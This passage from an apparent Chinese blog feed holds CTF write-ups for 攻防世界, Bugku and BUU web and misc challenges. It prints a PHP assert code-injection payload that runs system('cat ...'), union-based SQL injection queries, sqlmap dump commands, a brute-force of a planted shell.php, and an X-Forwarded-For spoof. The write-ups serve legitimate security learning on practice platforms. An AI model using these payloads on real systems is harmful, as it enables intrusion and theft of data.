&quot;admin&quot;);</code></pre><p>故构造:<br><code>?id=%2561dmin</code></p><p>得到flag<br><img src="http://img-blog.csdnimg.cn/20191015201013128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>3、mfw</strong><br>打开题目，是一个网站：<br><img src="http://img-blog.csdnimg.cn/20191015202250382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>随便翻翻，发现这个页面<br><img src="http://img-blog.csdnimg.cn/2019101520294454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>怀疑存在源码泄露，用dirsearch扫描一下，发现git源码泄露：</p><p><img src="http://img-blog.csdnimg.cn/2019101520374553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件。<br>用法：</p><pre><code>dirsearch.py -u 目标网址 -e *(指定语言，也可以不指定为*)</code></pre><p>详细请看：<code>https://www.freebuf.com/column/153277.html</code><br>果然存在git源码泄露；</p><p>利用GitHack下载源码<br>关于GitHack一个git泄露利用脚本，很好用~<br>详细请看<code>https://www.freebuf.com/sectool/66096.html</code><br>常用</p><pre><code>python27 GitHack.py url/.git/</code></pre><p><img src="http://img-blog.csdnimg.cn/20191015204333899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载完成，得到一个以url命名的文件夹；打开发现有flag.php但里面没东西；<br>查看index.php文件：<br><img src="http://img-blog.csdnimg.cn/20191015205219293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到了关键代码：</p><pre><code>&lt;?phpif (isset($_GET[&#39;page&#39;])) &#123;    $page = $_GET[&#39;page&#39;];&#125; else &#123;    $page = &quot;home&quot;;&#125;$file = &quot;templates/&quot; . $page . &quot;.php&quot;;// I heard &#39;..&#39; is dangerous!assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);// TODO: Make this look niceassert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);?&gt;</code></pre><p>分析代码可知，<br>若想得到flag，即得到”Detected hacking attempt!”<br>则需要给page传入的须满足</p><pre><code>$file = &quot;templates/&quot; . $page . &quot;.php&quot;;assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;)</code></pre><p>尝试</p><pre><code>?page=abc&#39;) or system(&quot;cat templates/flag.php&quot;);//</code></pre><p>即</p><pre><code>$file = &quot;templates/?page=abc&#39;) or system(&quot;cat templates/flag.php&quot;);//.php&quot;;</code></pre><p>即传<code>?page=abc&#39;) or system(&quot;cat templates/flag.php&quot;);//</code></p><p>拼成下面语句：</p><pre><code>assert(&quot;strpos(&#39;templates/?page=abc&#39;) or system(&quot;cat templates/flag.php&quot;);//.php&#39;, &#39;..&#39;) === false&quot;) ordie(&quot;Detected hacking attempt!&quot;);</code></pre><p>F12 得到flag<br><img src="http://img-blog.csdnimg.cn/20191015205840114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>assert() 函数：<br>用来判断一个表达式是否成立。返回true or false<br>详细：<code>https://www.cnblogs.com/yuerdongni/archive/2013/10/12/3364954.html</code><br>strpos()函数：<br><img src="http://img-blog.csdnimg.cn/20191015210633922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>参考文章：<code>https://blog.csdn.net/wyj_1216/article/details/95218671</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界 web（二）</title>
      <link href="2019/10/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20web%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>2019/10/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20web%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>这周接着刷攻防世界的web题（￣︶￣）↗　<br>1、command_execution<br>2、simple_php<br>3、NaNNaNNaNNaN-Batman<br>4、NewsCenter</p><a id="more"></a><h2 id="1、command-execution"><a href="#1、command-execution" class="headerlink" title="1、command_execution"></a>1、command_execution</h2><p><img src="https://img-blog.csdnimg.cn/20190925201112852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看提示这题为<strong>命令执行漏洞（command_execution）</strong>，关于命令执行漏洞，我前面有篇博客详细介绍了，大家不了解的话的可以去看看<code>https://blog.csdn.net/qq_43531669/article/details/99771487</code><br>先尝试一下127.0.0.1 发现执行成功，得到回显：<br><img src="https://img-blog.csdnimg.cn/20190927195057483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那没什么好说的了，直接查看目录下的所有文件吧：<br><img src="https://img-blog.csdnimg.cn/20190927195438230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到这些，接着查看home目录下的文件：<br><img src="https://img-blog.csdnimg.cn/20190927195602377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现flag文件，然后查看得到flag<br><img src="https://img-blog.csdnimg.cn/20190927200107438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="2、simple-php"><a href="#2、simple-php" class="headerlink" title="2、simple_php"></a>2、simple_php</h2><p><img src="https://img-blog.csdnimg.cn/20190927200346866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开题目地址：</p><pre><code>﻿&lt;?phpshow_source(__FILE__);include(&quot;config.php&quot;);$a=@$_GET[&#39;a&#39;];$b=@$_GET[&#39;b&#39;];if($a==0 and $a)&#123;    echo $flag1;&#125;if(is_numeric($b))&#123;    exit();&#125;if($b&gt;1234)&#123;    echo $flag2;&#125;?&gt;</code></pre><p>得到这么几串代码<br>意思是当a==0，但a的值又不能为0时输出flag1，b大于1234，并且b不是数字时输出flag2； 于是构造：<code>?a=0a&amp;b=12345A</code>便可绕过得到完整的flag。<img src="https://img-blog.csdnimg.cn/20190927201406132.png" alt="在这里插入图片描述"></p><h2 id="3、NaNNaNNaNNaN-Batman"><a href="#3、NaNNaNNaNNaN-Batman" class="headerlink" title="3、NaNNaNNaNNaN-Batman"></a>3、NaNNaNNaNNaN-Batman</h2><p><img src="https://img-blog.csdnimg.cn/20190927205956336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>知识点</strong>：js代码（eval函数,alert函数）正则、代码审计</p><blockquote><p>eval() 函数:可计算某个字符串，并执行其中的的 JavaScript 代码。<br>alert()函数:用于显示带有一条指定消息和一个确定按钮的警告框。</p></blockquote><p>下载附件，以文本格式打开：<br><img src="https://img-blog.csdnimg.cn/20190928091903759.png" alt="在这里插入图片描述"><br>是一段JS的代码，改后缀为.html在游览器打开：<br><img src="https://img-blog.csdnimg.cn/20190928094003459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有一个输入框，但输入什么都没有反应，继续分析js代码   <code>=￣ω￣=</code> 审计代码可以看到<code>eval</code>函数执行了<code>_</code>变量中的内容也就是<code>&#39; &#39;</code>中的内容，但是，要注意的是，它并没有执行<code>$()</code>函数，仅仅执行了字符串而已（从而导致乱码），因而页面html页面没有任何显示，只显示了input标签的内容，但是我们想让源代码正常显示出来，不进行执行，那么，我们就用到了alert弹窗（将eval函数改为alert），将乱码的<code>$()</code>函数源码完整显示出来：<br><img src="https://img-blog.csdnimg.cn/20190928101554343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>整理一下得到：</p><pre><code>function $()&#123;var e=document.getElementById(&quot;c&quot;).value;if(e.length==16)   if(e.match(/^be0f23/)!=null)      if(e.match(/233ac/)!=null)         if(e.match(/e98aa$/)!=null)             if(e.match(/c7be9/)!=null)&#123;             var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];             var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];             var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];             var i=[&quot;it&#39;&quot;,&quot;_&quot;,&quot;n&quot;];             var s=[t,n,r,i];             for(var o=0;o&lt;13;++o)&#123;             document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;             &#125;&#125;document.write(&#39;&lt;input id=&quot;c&quot;&gt;&lt;button οnclick=$()&gt;Ok&lt;/button&gt;&#39;);delete _</code></pre><p>分析代码，我们的目标是打印出<code>document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;</code><br>因此我们要满足关键变量e的条件</p><pre><code>e.length==16e.match(/^be0f23/)!=nulle.match(/233ac/)!=nulle.match(/e98aa$/)!=nulle.match(/c7be9/)!=null</code></pre><p>这里又用到了正则表达式 <code>^</code>表示开头一定要匹配到be0f23，<code>$</code>表示结尾一定要匹配到e98aa，其它的只要匹配到就好，没有位置要求，于是构造<code>e=be0f233ac7be98aa</code><br>在输入框中输入e的值，点击Ok<br>成功得到flag：<br><code>flag&#123;it’s_a_h0le_in_0ne&#125;</code></p><p>也可以直接将核心代码直接在控制台执行</p><pre><code>var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];        var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];        var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];        var i=[&quot;it&#39;&quot;,&quot;_&quot;,&quot;n&quot;];        var s=[t,n,r,i];    for(var o=0;o&lt;13;++o)        &#123;         document.write(s[o%4][0]);         s[o%4].splice(0,1)        &#125;</code></pre><p><img src="https://img-blog.csdnimg.cn/20190928120243165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="4、NewsCenter"><a href="#4、NewsCenter" class="headerlink" title="4、NewsCenter"></a>4、NewsCenter</h2><p><img src="https://img-blog.csdnimg.cn/20190928212847819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这一题考察的是 SQL 注入，这里演示下手动注入和sqlmap两种方法。</p><h3 id="手动注入："><a href="#手动注入：" class="headerlink" title="手动注入："></a>手动注入：</h3><p>首先查返回列，经测试共三列返回数据。<img src="https://img-blog.csdnimg.cn/20191005132953391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接着查看数据库名，看到库名为news</p><p><img src="https://img-blog.csdnimg.cn/20191005133051511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查表名，构造命令：<code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() </code><img src="https://img-blog.csdnimg.cn/20191005133338522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到两个表，news中无数据，查看表 secret_table字段<br><code>1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39; secret_table&#39;</code><br><img src="https://img-blog.csdnimg.cn/20191005133834584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后执行查询语句<br><code>0&#39; union select 1,2,fl4g from secret_table#</code></p><p><img src="https://img-blog.csdnimg.cn/2019100513405950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag。</p><h3 id="Sqlmap自动注入："><a href="#Sqlmap自动注入：" class="headerlink" title="Sqlmap自动注入："></a>Sqlmap自动注入：</h3><p>首先用bp抓包，得到http文件头<br><img src="https://img-blog.csdnimg.cn/20191005134302818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>保存为文本。然后执行命令：<code>  python sqlmap.py -r 1.txt --dbs</code> 查数据库<img src="https://img-blog.csdnimg.cn/20191005134426206.png" alt="在这里插入图片描述"><br>再执行命令：<code> python sqlmap.py -r 1.txt -D news --dump</code> 获取库中的所有数据<img src="https://img-blog.csdnimg.cn/20191005134942111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到 flag ！   (￣▽￣)”/</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku web(一)</title>
      <link href="2019/09/12/Bugku%E2%80%94%E2%80%94web(%E4%B8%80)/"/>
      <url>2019/09/12/Bugku%E2%80%94%E2%80%94web(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<p>前言：<br>最近做了几个bugku的web题，感觉挺有意思的，学到了不少东西；顺便总结下。（=￣ω￣=）<hr></p><p><strong>1、你必须让他停下</strong>：<br><img src="https://img-blog.csdnimg.cn/20190903210137651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开链接，发现有个一直在闪的页面，时不时还会出现张图片；这是用了 js的<code>setTimeout</code>函数，只需在设置中禁用js,然后手动刷新界面直到出现图片，然后再查看源代码flag就会flag出来了。</p><ul><li>谷歌游览器关闭<strong>JavaScrip</strong>：设置→高级→隐私设置→网站设置，找到并关闭。<br><img src="https://img-blog.csdnimg.cn/20190904192547427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还有就是可以用抓包工具（burp），<code>Send to Repeater</code>,然后多点几次send，就能得到flag了。<br><img src="https://img-blog.csdnimg.cn/20190904193636341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><p><strong>2、web5</strong> :<img src="https://img-blog.csdnimg.cn/20190903204530749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开链接，是一个表单提交页面，无论你输入什么，都会给你提示：再好好看看（还是错别字2333…），右键查看下源码：<br><img src="https://img-blog.csdnimg.cn/2019090520260490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>百度发现是jother编码。然后将它复制粘贴到console中回车，出现了flag<br><img src="https://img-blog.csdnimg.cn/20190904194434274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提交<br><img src="https://img-blog.csdnimg.cn/20190905202756507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看下格式，应该是大写<br><img src="https://img-blog.csdnimg.cn/20190905203027603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>退出去提交，成功。</p><p><strong>3、头等舱</strong><br><img src="https://img-blog.csdnimg.cn/20190905203128976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开发现什么也没有…，查看源码也啥也没有。没什么好说的了，抓包！<br>Send to repeater →send发包<br>得到flag。<br><img src="https://img-blog.csdnimg.cn/20190905203725971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>4、网站被黑</strong><br><img src="https://img-blog.csdnimg.cn/20190905204738646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如题所说，这题没什么技术含量，但实战中经常用到；打开：<br><img src="https://img-blog.csdnimg.cn/20190905204657691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个页面挺好玩，感觉前端好NB。<br>直接御剑扫描下<br><img src="https://img-blog.csdnimg.cn/20190905205838694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到两个链接，打开后缀为shell.php的<br><img src="https://img-blog.csdnimg.cn/20190905210305649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来就去爆破密码，使用的工具是Burp（想要的同学可以私信我）<br>在shell.php里随便输入一个密码，抓包，设置变量<br><img src="https://img-blog.csdnimg.cn/20190905211006428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Add from list 那选为password 这是一个burp pro里自带的一个字典<br><img src="https://img-blog.csdnimg.cn/20190905211104895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击Start attack 开始爆破。<br><img src="https://img-blog.csdnimg.cn/20190905211303913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">第一个即为密码，输入密码得到flag<br><img src="https://img-blog.csdnimg.cn/20190905211542446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>5、管理员系统</strong><br><img src="https://img-blog.csdnimg.cn/20190908191607434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开链接，是一个表单提交页面：<br><img src="https://img-blog.csdnimg.cn/2019090819175197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现我无论输入什么，都会得到一句反馈：IP禁止访问，请联系本地管理员登陆，IP已被记录.<br>查看源码，在最后一行发现一串编码：<code>&lt;!-- dGVzdDEyMw== --&gt;</code> 一看就是base64编码，解码得到：<code>test123</code>，这里盲猜usename为：admin ，将<code>test123</code>作为密码，<br>根据“IP禁止访问，请联系本地管理员登陆，IP已被记录.”这句得到新思路：伪装成本地访问：<br>　　抓包；改包：Headers中增添一对键值对：<code>X-Forwarded-For : 127.0.0.1</code><br>　　得到flag<br>　　<img src="https://img-blog.csdnimg.cn/20190911225704754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU刷题记录——Misc(一)</title>
      <link href="2019/09/12/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94Misc(%E4%B8%80)/"/>
      <url>2019/09/12/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94Misc(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>最近学习之余在BUU上刷了几道misc题，有一些没接触过的知识，挺有意思的，顺便来记录下。<hr></p><h5 id="1、九连环"><a href="#1、九连环" class="headerlink" title="1、九连环"></a>1、九连环</h5><p>涉及到的知识点：</p><ul><li>steghide的使用</li></ul><p>打开附件，是一张图片<br><img src="https://img-blog.csdnimg.cn/20210213113213717.jpg" alt="在这里插入图片描述"><br>丢winhex里看一下，搜索jpg文件尾 FF D9，发现后面有压缩包，<br><img src="https://img-blog.csdnimg.cn/20210214150209264.png" alt="在这里插入图片描述"><br>用foremost分离出一个压缩包且存在伪加密<br><img src="https://img-blog.csdnimg.cn/20210214151342639.png" alt="在这里插入图片描述"><br>把01改为00后，打开压缩包 里面有一张图片和压缩包<br><img src="https://img-blog.csdnimg.cn/20210214152049918.png" alt="在这里插入图片描述"><br>这个压缩包也是加密的，密码大概率是在图片中的，对着图片分析了一圈没什么发现，在查看wp之后知道需要用到 Steghide工具。<a href="https://blog.csdn.net/Blood_Seeker/article/details/81837571">工具介绍</a></p><p> <strong>工具使用</strong>：</p><p>Steghide是一款开源的隐写术软件，可以在一张图片或者音频文件中隐藏信息，同时也可以提取在图片或音频中的隐藏信息。</p><p>kali下steghide的安装：</p><pre><code class="bash">apt-get install steghide</code></pre><p>使用：<br><img src="https://img-blog.csdnimg.cn/20210214155028491.png" alt="在这里插入图片描述"><br>隐藏信息没有设置密码，直接回车即可。得到隐藏文件，打开<br><img src="https://img-blog.csdnimg.cn/20210214155458703.png" alt="在这里插入图片描述"><br>使用密码打开压缩包，得到flag<br><img src="https://img-blog.csdnimg.cn/20210214155614270.png" alt="在这里插入图片描述"></p><h5 id="2、面具下的flag"><a href="#2、面具下的flag" class="headerlink" title="2、面具下的flag"></a>2、面具下的flag</h5><p>打开附件，是一张jpg格式的图片<br><img src="https://img-blog.csdnimg.cn/20210214161947870.jpg" alt="在这里插入图片描述"><br>winhex看一下，发现图片尾后有zip文件<br><img src="https://img-blog.csdnimg.cn/20210214162423279.png" alt="在这里插入图片描述"><br>foremost分离出压缩包，且存在伪加密，09 改为 00 解除伪加密，压缩包里面是一个vmdk类型的文件<br><img src="https://img-blog.csdnimg.cn/20210214223238305.png" alt="在这里插入图片描述"><br>之前没见过这种类型的文件，百度了一下，知道这种文件可以用 7z 进行解压提取，在kali中使用 7z 解压：<br><img src="https://img-blog.csdnimg.cn/20210214224646275.png" alt="在这里插入图片描述"><br>得到几个文件夹，其中 key_part_one 和 key_part_two 中含有Brainfuck与Ook!的加密文本 ，解密后将得到的字符串前拼接起来就得到了flag。</p><p>在线网站：<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a><br><img src="https://img-blog.csdnimg.cn/20210214225655176.png" alt="在这里插入图片描述"></p><h5 id="3、刷新过的图片"><a href="#3、刷新过的图片" class="headerlink" title="3、刷新过的图片"></a>3、刷新过的图片</h5><p>打开附件，是一张图片<br><img src="https://img-blog.csdnimg.cn/20210214230352744.jpg" alt="在这里插入图片描述"><br>各种尝试都没发现什么东西，百度了才知道这题用到了F5隐写。</p><p>kali下安装 F5-steganography：</p><pre><code class="bash">git clone https://github.com/matthewgao/F5-steganography</code></pre><p>安装完成后如下<br><img src="https://img-blog.csdnimg.cn/2021021423211023.png" alt="在这里插入图片描述"></p><p>使用方法：</p><pre><code class="bash">java Extract 图片路径 [-p 密码]</code></pre><p><img src="https://img-blog.csdnimg.cn/20210214231942390.png" alt="在这里插入图片描述"><br>得到out.text文件，很明显是一个zip文件<br><img src="https://img-blog.csdnimg.cn/20210214232211376.png" alt="在这里插入图片描述"><br>后缀名改为zip，发现有伪加密，修改之后再解压就可以得到 flag.txt<br><img src="https://img-blog.csdnimg.cn/20210214232425793.png" alt="在这里插入图片描述"></p><h5 id="4、snake"><a 